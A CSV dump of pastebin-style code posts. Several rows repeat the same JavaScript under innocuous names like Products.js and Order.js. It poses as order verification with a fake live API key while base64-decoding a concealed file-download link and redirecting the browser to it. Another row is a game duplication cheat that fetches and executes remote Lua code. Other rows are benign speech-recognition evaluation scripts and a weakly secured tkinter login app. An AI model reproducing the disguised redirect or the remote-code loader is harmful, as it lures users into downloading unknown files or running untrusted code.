id,title,username,language,date,content
agQ8D0XY,Products.js,REAPER_03,JavaScript,Thursday 29th of May 2025 01:04:42 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/48840/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FqZBH8fU,Grow A Garden Dupe v2,velvetkk,Lua,Thursday 29th of May 2025 01:04:08 PM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/castleofsolace/GrowAGardenDUPE1/refs/heads/main/mainHub""))()


-- CHANGELOGS [05/29/2025]
-- Fixed pets not being duped
-- Added dupe delay
-- Removed gear duping (caused bans)"
ufY16MTm,Order.js,REAPER_03,JavaScript,Thursday 29th of May 2025 12:59:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/49481/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YKJiSzKv,Market.js,REAPER_03,JavaScript,Thursday 29th of May 2025 12:53:53 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13483/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZRzjNqDf,Untitled,REAPER_03,JavaScript,Thursday 29th of May 2025 12:48:31 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71170/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4igf7KVj,Results_evaluation.py,cataleena,Python,Thursday 29th of May 2025 12:19:08 PM CDT,"import csv
from collections import Counter

# --- CONFIGURATION ---
INPUT_CSV = ""ok_whisper_eval_results_tiny.csv""  # Update as needed

# --- Initialize accumulators ---
latencies = []
wers = []
num_valid_entries = 0

# --- Read the CSV and process rows ---
with open(INPUT_CSV, newline="""", encoding=""utf-8"") as csvfile:
    reader = csv.DictReader(csvfile)
    
    for row in reader:
        try:
            latency = float(row[""latency_per_sec""])
            wer = float(row[""WER""])
            latencies.append(latency)
            wers.append(wer)
            num_valid_entries += 1
        except ValueError:
            print(f""Skipping invalid row: {row['file_name']}"")

# --- Function to calculate distribution bins ---
def get_distribution(values, bins=5, label=""Value""):
    if not values:
        return {}
    min_val, max_val = min(values), max(values)
    step = (max_val - min_val) / bins
    bin_edges = [min_val + i * step for i in range(bins + 1)]
    bin_counts = Counter()

    for v in values:
        for i in range(bins):
            if bin_edges[i] <= v < bin_edges[i + 1]:
                bin_counts[f""{bin_edges[i]:.2f} - {bin_edges[i + 1]:.2f}""] += 1
                break
        else:
            if v == bin_edges[-1]:
                bin_counts[f""{bin_edges[-2]:.2f} - {bin_edges[-1]:.2f}""] += 1

    print(f""\n {label} Distribution (bins={bins}):"")
    for bin_label in sorted(bin_counts.keys()):
        print(f""  {bin_label}: {bin_counts[bin_label]}"")

# --- Compute and print results ---
if num_valid_entries > 0:
    avg_latency = round(sum(latencies) / num_valid_entries, 3)
    min_latency = round(min(latencies), 3)
    max_latency = round(max(latencies), 3)

    avg_wer = round(sum(wers) / num_valid_entries, 3)
    min_wer = round(min(wers), 3)
    max_wer = round(max(wers), 3)

    print(f"" Processed {num_valid_entries} entries from {INPUT_CSV}"")
    print(f""\n Latency/sec   Avg: {avg_latency}, Min: {min_latency}, Max: {max_latency}"")
    print(f"" WER             Avg: {avg_wer}, Min: {min_wer}, Max: {max_wer}"")

    get_distribution(latencies, bins=5, label=""Latency/sec"")
    get_distribution(wers, bins=5, label=""WER"")
else:
    print("" No valid entries found."")"
AwyCwkcb,Products.js,REAPER_03,JavaScript,Thursday 29th of May 2025 12:16:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76473/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zw7qBYUW,Order.js,REAPER_03,JavaScript,Thursday 29th of May 2025 12:10:18 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/30905/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vumeUCQh,Python login/signup page with encryption and hashes,abdullahafzel1010,Python,Thursday 29th of May 2025 12:09:04 PM CDT,"from tkinter import *
import tkinter
import tkinter.filedialog
from functools import partial
import os
from binascii import *
from hashlib import *
from cryptography.fernet import Fernet, InvalidToken
from pathlib import *

root = Tk()
root.title(""Login"")
canvas = Canvas(root, width=500, height=500)
global usernameid
labelFont = (""Verdana"", 13)

# loading in the folders and files for first time use or files/folders not found
if not Path(""Accounts"").is_dir():
    os.mkdir(""Accounts"")
if not Path(""Keys"").is_dir():
    os.mkdir(""Keys"")
if not Path(""accs"").is_dir():
    os.mkdir(""accs"")
if not Path(""accs/passwords.txt"").is_file():
    file = open(""accs/passwords.txt"", ""w+"")
    file.close()
if not Path(""accs/usernames.txt"").is_file():
    file1 = open(""accs/usernames.txt"", ""w+"")
    file1.close()

def LoggedIn():
    root.quit()
    CurrentStat = StringVar()
    CurrentStat.set(""..."")
    OutputStat = StringVar(value="""")
    FileToOpen = """"

    def createFile():
        content = f""""""
Id: {IdEntry.get()}
Username: {UsernameEntry.get()}
Password: {PasswordEntry.get()}
            """"""
        print(content)
        print(content)
        file = open(""Accounts/%s.txt"" % IdEntry.get(), ""wb"")
        encrypted = fernet.encrypt(content.encode())
        file.write(encrypted)
        file.close()

    def openFile():
        fileToOpen = tkinter.filedialog.askopenfilename(initialdir=""Accounts"", title=""Select A File"",
                                                filetypes=((""txt files"", ""*.txt""), (""all files"", '*.*')))
        StatusBar.config(text=""Status: Working"")
        try:

            file = open(fileToOpen, ""r"")
            text = file.read().encode()
            text_decrypted = fernet.decrypt(text).decode()
            print(text_decrypted)
            output.insert(INSERT, text_decrypted)
        except FileNotFoundError:
            pass
        except InvalidToken:
            StatusBar.config(text=""Invalid File Or Another Users File"")

    username = str(usernameVar.get())
    root3 = Tk()
    canvas3 = Canvas(root3, width=750, height=400)
    root3.title(""Welcome, %s"" % username.capitalize())
    # Generating a Fernet key, when a new user joins. Every User has its own unique key.
    usernamehash = hexlify(pbkdf2_hmac(""sha256"", username.encode(), b""salt"", 100000))
    try:
        # Checking if a key exists
        file = open(""Keys/%s.key"" % usernamehash, ""rb"")
        key = file.read()
        file.close()
    except FileNotFoundError:
        # if not then generate one and create a file with the key specified to the user.
        key = Fernet.generate_key()
        file = open(""Keys/%s.key"" % usernamehash, ""wb"")
        file.write(key)
        file.close()
    finally:
        # finally opening the file with the key. To be sure that the new user has a key.
        file = open(""Keys/%s.key"" % usernamehash, ""rb"")
        key = file.read()
        file.close()
        fernet = Fernet(key)

    welcomeLabel = Label(root3, text=""Welcome, %s"" % username.capitalize(), font=(""Verdana"", 17))
    canvas3.create_window(750 / 2, 10, window=welcomeLabel)

    StatusBar = Label(root3, text=""Status: Working"", font=(""Verdana"", 13), borderwidth=3, relief=""sunken"")
    canvas3.create_window(375, 50, window=StatusBar)

    openButton = Button(root3, text=""Open File"", font=(""Verddana"", 10), width=7, height=2, command=openFile)
    canvas3.create_window(120, 150, window=openButton)

    openDescription = Label(root3, text=""Open Files That You Have Created(Decrypted Version)"", font=(""Verdana"", 13))
    canvas3.create_window(262, 100, window=openDescription)

    createButton = Button(root3, text=""Create"", font=(""Verdana"", 15), command=createFile)
    canvas3.create_window(375, 370, window=createButton)

    createDescription = Label(root3, text=""Create new file(s)/Id(s) such as your Gmail Id/Account(s)"",
                              font=(""Verdana"", 12))
    canvas3.create_window(260, 205, window=createDescription)

    exitButton = Button(root3, text=""Exit"", font=(""Verdana"", 15), command=exit)
    canvas3.create_window(700, 350, window=exitButton)

    output = Text(root3, width=25, borderwidth=3, height=4, relief=""sunken"")  # Output
    canvas3.create_window(300, 150, window=output)

    UsernameLabel = Label(root3, text=""Username/Email"", font=(""Verdana"", 13))
    canvas3.create_window(100, 250, window=UsernameLabel)

    UsernameVar = StringVar(value="""")
    UsernameEntry = Entry(root3, textvariable=UsernameVar, font=(""Verdana"", 13), width=30)
    canvas3.create_window(420, 250, window=UsernameEntry)

    PasswordLabel = Label(root3, text=""Password"", font=(""Verdana"", 13))
    canvas3.create_window(70, 290, window=PasswordLabel)

    passwordVar = StringVar(value="""")
    PasswordEntry = Entry(root3, textvariable=passwordVar, font=(""Verdana"", 13), width=30)
    canvas3.create_window(420, 290, window=PasswordEntry)

    IdLabel = Label(root3, text=""Id Of The File"", font=(""Verdana"", 13))
    canvas3.create_window(87, 330, window=IdLabel)

    IdVar = StringVar(value="""")
    IdEntry = Entry(root3, textvariable=IdVar, font=(""Verdana"", 13), width=30)
    canvas3.create_window(420, 330, window=IdEntry)

    canvas3.pack()
    root3.mainloop()


def Signup():
    root2 = Tk()
    canvas2 = Canvas(root2, width=750, height=400)

    userLabel = Label(root2, text=""UserName"", font=labelFont)
    canvas2.create_window(75, 50, window=userLabel)

    uservar = StringVar(value="""")
    username = Entry(root2, textvariable=uservar, font=labelFont, width=40)
    canvas2.create_window(400, 50, window=username)

    passLabel = Label(root2, text=""Password"", font=labelFont)
    canvas2.create_window(73, 85, window=passLabel)

    passvar = StringVar()
    password = Entry(root2, textvariable=passvar, font=labelFont, width=40)
    canvas2.create_window(400, 85, window=password)

    def write():

        userKey = open(""accs/usernames.txt"", ""r"")
        userw = userKey.read().split(""\n"")
        usernamedecrypted = hexlify(pbkdf2_hmac('sha256', username.get().encode(), b'salt', 100000)).decode()
        check = False
        try:
            for user in userw:

                if usernamedecrypted == user:
                    check = True
        finally:
            if check == False:

                print(""user created"")
                file = open(""accs/usernames.txt"", ""a"")
                file.write(f""\n{hexlify(pbkdf2_hmac('sha256', username.get().encode(), b'salt', 100000)).decode()}"")
                print(username.get())
                usernameid = username.get()
                file.close()

                file = open(""accs/passwords.txt"", ""a"")
                file.write(f'\n' + hexlify(pbkdf2_hmac('sha256', password.get().encode(), b'salt', 100000)).decode())
                print(password.get())
                file.close()
                print(""passwords hashed"")
            else:
                print(""user already exists"")
                messageBox = messagebox.showinfo(title=""User Exists"", message=""User Already Exists!"")

    button = Button(root2, text=""Sign Up"", font=labelFont,
                    command=write)
    canvas2.create_window(200, 150, window=button)

    canvas2.pack()
    root2.mainloop()


def Login(usernamevar, passwordvar, status, user):
    try:
        userKey = open(""accs/usernames.txt"", ""r"")
        userw = userKey.read().split(""\n"")

        userKey.close()

        file = open(""accs/passwords.txt"", ""r"")
        passw = file.read().split(""\n"")
        file.close()

        userk = pbkdf2_hmac('sha256', usernamevar.get().encode(), b'salt', 100000)
        passk = pbkdf2_hmac('sha256', passwordvar.get().encode(), b'salt', 100000)
        usernamevar = hexlify(userk).decode()
        passwordvar = hexlify(passk).decode()
    except FileNotFoundError:
        status.config(text=""Invalid Password or username"")

    check = False
    # identifying hashes
    try:
        for password in passw:
            for username in userw:
                if not check:
                    if usernamevar == username and passwordvar == password:
                        print(""valid"")
                        status.config(text=""Logged In"")
                        check = True
                        LoggedIn()
    finally:
        if not check:
            print('invalid')
            status.config(text=""Invalid Username Or password"")


stat = ""...""

usernameLabel = Label(root, text=""Username"", font=('Verdana', 13))
canvas.create_window(200, 70, window=usernameLabel)

usernameVar = StringVar()
usernameVar.set("""")
Username = Entry(root, textvariable=usernameVar, font=(""Verdana"", 15))
canvas.create_window(200, 100, window=Username)

passwordLabel = Label(root, text=""Password"", font=('Verdana', 12))
canvas.create_window(200, 125, window=passwordLabel)

PasswordVar = StringVar(value="""")
Password = Entry(root, textvariable=PasswordVar, font=(""Verdana"", 15))
canvas.create_window(200, 150, window=Password)

signup = Button(root, text=""Signup"", font=(""Verdana"", 12), command=Signup)
canvas.create_window(270, 190, window=signup)

status = Label(root, text=""Waiting..."", font=(""Verdaana"", 13))
canvas.create_window(200, 20, window=status)

us = usernameVar

Confirm = Button(root,
                 text=""Login"",
                 command=partial(Login, usernameVar, PasswordVar, status, us),
                 font=('Verdana', 12))

canvas.create_window(200, 190, window=Confirm)

canvas.pack()
root.mainloop()"
W3kAjhru,Wav2Vec-catalina,cataleena,Python,Thursday 29th of May 2025 12:07:30 PM CDT,"import os
import glob
import csv
import time
import resource
import soundfile as sf
from jiwer import wer
import torch
from transformers import Wav2Vec2ForCTC, Wav2Vec2Processor

# --- CONFIGURATION ---
AUDIO_ROOT = ""/home/catalina/datasets/LibriSpeech/dev-clean""
OUTPUT_CSV = ""wav2vec2_eval_results.csv""
MODEL_NAME = ""facebook/wav2vec2-base-960h""

print(""Loading ground truth transcriptions..."")
ground_truths = {}
trans_files = glob.glob(os.path.join(AUDIO_ROOT, ""*"", ""*"", ""*.trans.txt""))

for trans_file in trans_files:
    with open(trans_file, ""r"", encoding=""utf-8"") as f:
        for line in f:
            parts = line.strip().split(maxsplit=1)
            if len(parts) == 2:
                file_id, transcript = parts
                ground_truths[file_id + "".flac""] = transcript.strip()
print(f""Loaded {len(ground_truths)} transcriptions."")

print(""Collecting .flac audio files..."")
audio_files = glob.glob(os.path.join(AUDIO_ROOT, ""*"", ""*"", ""*.flac""))
print(f""Found {len(audio_files)} audio files.\n"")

print(f""Loading Wav2Vec2 model and processor ({MODEL_NAME})..."")
processor = Wav2Vec2Processor.from_pretrained(MODEL_NAME)
model = Wav2Vec2ForCTC.from_pretrained(MODEL_NAME)
model.eval()
if torch.cuda.is_available():
    model.to(""cuda"")
print(""Model loaded.\n"")

def transcribe(audio_path):
    # Read audio
    speech, sample_rate = sf.read(audio_path)
    if sample_rate != 16000:
        raise ValueError(f""Expected 16kHz sample rate, got {sample_rate}"")

    input_values = processor(speech, sampling_rate=sample_rate, return_tensors=""pt"").input_values
    if torch.cuda.is_available():
        input_values = input_values.to(""cuda"")

    with torch.no_grad():
        logits = model(input_values).logits
    predicted_ids = torch.argmax(logits, dim=-1)
    transcription = processor.batch_decode(predicted_ids)[0]
    return transcription.lower()

with open(OUTPUT_CSV, mode=""w"", newline="""", encoding=""utf-8"") as csvfile:
    writer = csv.writer(csvfile)
    writer.writerow([
        ""model"",
        ""file_name"",
        ""speaker_id"",
        ""chapter_id"",
        ""audio_duration_sec"",
        ""transcription_time_sec"",
        ""latency_per_sec"",
        ""WER"",
        ""RAM_peak_MB"",
        ""transcription""
    ])

    for idx, file_path in enumerate(audio_files, start=1):
        file_name = os.path.basename(file_path)
        speaker_id = os.path.basename(os.path.dirname(os.path.dirname(file_path)))
        chapter_id = os.path.basename(os.path.dirname(file_path))

        print(f""[Wav2Vec2] Transcribing: {file_name} ({idx} of {len(audio_files)})"")

        try:
            speech, sample_rate = sf.read(file_path)
        except Exception as e:
            print(f""Skipping {file_name}, error reading audio: {e}"")
            continue

        duration = len(speech) / sample_rate

        usage_before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        start_time = time.time()

        try:
            transcript = transcribe(file_path)
        except Exception as e:
            print(f""Error transcribing {file_name}: {e}"")
            continue

        end_time = time.time()
        transcription_time = end_time - start_time
        latency = transcription_time / duration if duration > 0 else 0

        usage_after = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        ram_peak_mb = round((usage_after - usage_before) / 1024, 2)

        ground_truth = ground_truths.get(file_name, """")
        if ground_truth:
            wer_value = round(wer(ground_truth.lower(), transcript.lower()), 3)
        else:
            wer_value = ""N/A""
            print(f""Warning: No ground truth found for {file_name}"")

        writer.writerow([
            ""wav2vec2"",
            file_name,
            speaker_id,
            chapter_id,
            round(duration, 2),
            round(transcription_time, 2),
            round(latency, 3),
            wer_value,
            ram_peak_mb,
            transcript
        ])
print(""Done."")
"
